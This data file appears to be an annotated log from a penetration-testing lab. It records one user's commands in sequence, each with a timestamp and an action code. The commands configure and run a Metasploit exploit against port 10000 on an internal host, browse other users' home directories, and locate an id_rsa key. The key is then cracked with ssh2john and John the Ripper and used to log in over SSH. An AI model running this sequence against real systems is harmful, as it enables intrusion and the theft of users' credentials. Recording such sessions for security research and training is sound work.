INPUT|69--36|A6 |1594800441|69|set lhost 172.18.1.5 |OUTPUT
INPUT|69--37|A6 |1594800461|69|set lport 10 000|OUTPUT
INPUT|69--38|A6 |1594800508|69|set lport 10000|OUTPUT
INPUT|69--39|V8 |1594800548|69|exploit|OUTPUT
INPUT|69--40|A6 |1594800770|69|set rhost 172.18.1.5|OUTPUT
INPUT|69--41|U|1594800786|69|ifconfig|OUTPUT
INPUT|69--42|A6 |1594800928|69|set lhost 10.1.135.83|OUTPUT
INPUT|69--43|V8 |1594800937|69|exploit|OUTPUT
INPUT|69--44|A6 |1594800998|69|set rport 10000|OUTPUT
INPUT|69--45|A6 |1594801005|69|set lhost|OUTPUT
INPUT|69--46|V8 |1594801299|69|exploit|OUTPUT
INPUT|69--47|A10 |1594802556|69|ls|OUTPUT
INPUT|69--48|A10 |1594802609|69|ls|OUTPUT
INPUT|69--49|U|1594802779|69|cd ..|OUTPUT
INPUT|69--50|U|1594802782|69|exit|OUTPUT
INPUT|69--51|A10 |1594802785|69|ls|OUTPUT
INPUT|69--52|A10 |1594802626|69|ls|OUTPUT
INPUT|69--53|U|1594802791|69|mfsconsole|OUTPUT
INPUT|69--54|A10 |1594802797|69|ls|OUTPUT
INPUT|69--55|V2 |1594802804|69|msfconsole|OUTPUT
INPUT|69--56|V5 |1594802839|69|show options|OUTPUT
INPUT|69--57|A6 |1594802916|69|set rhost 172.18.1.5|OUTPUT
INPUT|69--58|A6 |1594802929|69|set rport |OUTPUT
INPUT|69--59|U|1594802961|69|exit|OUTPUT
INPUT|69--60|A10 |1594802963|69|ls|OUTPUT
INPUT|69--61|V2 |1594802983|69|msfconsole|OUTPUT
INPUT|69--62|A6 |1594803042|69|set rport 10000|OUTPUT
INPUT|69--63|A6 |1594803048|69|set shost|OUTPUT
INPUT|69--64|A6 |1594803057|69|set rhost|OUTPUT
INPUT|69--65|A6 |1594803065|69|set rhost 172.18.1.5|OUTPUT
INPUT|69--66|A6 |1594803088|69|set lhost 10.1.135.83|OUTPUT
INPUT|69--67|V5 |1594803103|69|show options|OUTPUT
INPUT|69--68|A4 |1594803179|69|use 1.920|OUTPUT
INPUT|69--69|A6 |1594803197|69|set lhost|OUTPUT
INPUT|69--70|A6 |1594803204|69|set rhost|OUTPUT
INPUT|69--71|A6 |1594803223|69|set rhost 172.18.1.5|OUTPUT
INPUT|69--72|A6 |1594803232|69|set rport 10000|OUTPUT
INPUT|69--73|A10 |1594803501|69|ls|OUTPUT
INPUT|69--74|U|1594803510|69|cd /root|OUTPUT
INPUT|69--75|A10 |1594803512|69|ls|OUTPUT
INPUT|69--76|A10 |1594803627|69|ls|OUTPUT
INPUT|69--77|A10 |1594803639|69|cd ..ls|OUTPUT
INPUT|69--78|U|1594803642|69|cd ..|OUTPUT
INPUT|69--79|A10 |1594803643|69|ls|OUTPUT
INPUT|69--80|U|1594803653|69|home|OUTPUT
INPUT|69--81|U|1594803658|69|cd|OUTPUT
INPUT|69--82|A10 |1594803659|69|ls|OUTPUT
INPUT|69--83|U|1594803669|69|cd ..|OUTPUT
INPUT|69--84|A10 |1594803670|69|ls|OUTPUT
INPUT|69--85|U|1594803673|69|cd home|OUTPUT
INPUT|69--86|A10 |1594803673|69|ls|OUTPUT
INPUT|69--87|U|1594803686|69|cd eve|OUTPUT
INPUT|69--88|A10 |1594803688|69|ls|OUTPUT
INPUT|69--89|U|1594803715|69|cd ..|OUTPUT
INPUT|69--90|A10 |1594803715|69|ls|OUTPUT
INPUT|69--91|U|1594803715|69|cd|OUTPUT
INPUT|69--92|A10 |1594803715|69|ls|OUTPUT
INPUT|69--93|A10 |1594803725|69|ls|OUTPUT
INPUT|69--94|U|1594803728|69|cd ..|OUTPUT
INPUT|69--95|A10 |1594803729|69|ls|OUTPUT
INPUT|69--96|U|1594803731|69|cd home|OUTPUT
INPUT|69--97|A10 |1594803742|69|ls|OUTPUT
INPUT|69--98|U|1594803746|69|cd alice|OUTPUT
INPUT|69--99|A10 |1594803748|69|ls|OUTPUT
INPUT|69--100|U|1594803749|69|cd ..|OUTPUT
INPUT|69--101|A10 |1594803750|69|ls|OUTPUT
INPUT|69--102|U|1594803752|69|cd bob|OUTPUT
INPUT|69--103|A10 |1594803752|69|ls|OUTPUT
INPUT|69--104|U|1594803755|69|cd|OUTPUT
INPUT|69--105|U|1594803756|69|l|OUTPUT
INPUT|69--106|A10 |1594803759|69|ls|OUTPUT
INPUT|69--107|U|1594803760|69|c d..|OUTPUT
INPUT|69--108|A1 A9 A10 A11 A12 A17 |1594803853|69|locate|OUTPUT
INPUT|69--109|A10 |1594803982|69|find|OUTPUT
INPUT|69--110|U|1594804017|69|./.bash_historysa|OUTPUT
INPUT|69--111|U|1594804037|69|./.bash_history|OUTPUT
INPUT|69--112|U|1594804082|69|sudo ./.bash_history|OUTPUT
INPUT|69--113|U|1594804126|69|id_rsa|OUTPUT
INPUT|69--114|A14 A16 |1594804161|69|ssh2john.py|OUTPUT
INPUT|69--115|A10 A14 A16 |1594804177|69|find ssh2john.py|OUTPUT
INPUT|69--116|A10 |1594804248|69|ls|OUTPUT
INPUT|69--117|U|1594804282|69|cd ..|OUTPUT
INPUT|69--118|A10 |1594804282|69|ls|OUTPUT
INPUT|69--119|U|1594804294|69|cd home|OUTPUT
INPUT|69--120|A10 |1594804295|69|ls|OUTPUT
INPUT|69--121|U|1594804298|69|cd eve|OUTPUT
INPUT|69--122|A10 |1594804298|69|ls|OUTPUT
INPUT|69--123|U|1594804301|69|id|OUTPUT
INPUT|69--124|U|1594804312|69|id_rsa eve|OUTPUT
INPUT|69--125|A10 |1594804324|69|ls|OUTPUT
INPUT|69--126|A10 |1594804328|69|ls|OUTPUT
INPUT|69--127|A10 |1594804341|69|lsa|OUTPUT
INPUT|69--128|A10 |1594804344|69|ls a|OUTPUT
INPUT|69--129|U|1594804349|69|la|OUTPUT
INPUT|69--130|A10 |1594804352|69|ls a|OUTPUT
INPUT|69--131|U|1594804361|69|list all|OUTPUT
INPUT|69--132|U|1594804363|69|list|OUTPUT
INPUT|69--133|A10 |1594804369|69|lsa|OUTPUT
INPUT|69--134|M16 |1594804436|69|ssh eve@10.1.17.4|OUTPUT
INPUT|69--135|A10 |1594804476|69|ls|OUTPUT
INPUT|69--136|U|1594804480|69|cd ..|OUTPUT
INPUT|69--137|U|1594804495|69|cd ..|OUTPUT
INPUT|69--138|A10 |1594804496|69|ls|OUTPUT
INPUT|69--139|A14 |1594804773|69|john hash|OUTPUT
INPUT|69--140|A14 |1594805038|69|john bash|OUTPUT
INPUT|69--141|V16 |1594805357|69|/home/eve/.ssh# ssh -l id_rsa eve@172.17.5.4|OUTPUT
